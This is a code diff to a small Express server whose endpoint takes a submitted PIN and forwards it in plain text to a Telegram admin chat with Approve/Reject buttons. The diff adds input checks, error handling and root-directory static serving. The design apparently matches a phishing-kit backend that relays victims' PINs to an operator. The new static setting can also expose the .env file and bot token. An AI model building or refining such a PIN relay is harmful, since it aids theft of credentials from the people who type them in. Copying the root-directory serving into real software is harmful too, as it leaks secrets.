@@ -1,9 +1,14 @@
 require('dotenv').config();
 const express = require('express');
+const path = require('path');
 const app = express();
 
 app.use(express.json());
-app.use(express.static('public')); // serves your index.html + assets
+app.use(express.static(path.join(__dirname)));
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
@@ -11,25 +16,35 @@ const pendingRequests = {};
 
 app.post('/api/verify-pin', async (req, res) => {
   const { pin } = req.body;
+
+  if (!pin) {
+    return res.status(400).json({ error: 'PIN is required' });
+  }
+
   const requestId = Date.now().toString();
   pendingRequests[requestId] = { pin, status: 'pending' };
 
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: ADMIN_CHAT_ID,
-      text: `PIN submitted: ${pin}\nRequest ID: ${requestId}`,
-      reply_markup: {
-        inline_keyboard: [[
-          { text: '✅ Approve', callback_data: `approve_${requestId}` },
-          { text: '❌ Reject', callback_data: `reject_${requestId}` }
-        ]]
-      }
-    })
-  });
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: ADMIN_CHAT_ID,
+        text: `PIN submitted: ${pin}\nRequest ID: ${requestId}`,
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '✅ Approve', callback_data: `approve_${requestId}` },
+            { text: '❌ Reject', callback_data: `reject_${requestId}` }
+          ]]
+        }
+      })
+    });
 
-  res.json({ requestId, status: 'pending' });
+    res.json({ requestId, status: 'pending' });
+  } catch (err) {
+    console.error('Telegram send error:', err);
+    res.status(500).json({ error: 'Failed to notify admin' });
+  }
 });
 
 app.get('/api/verify-pin/status/:requestId', (req, res) => {
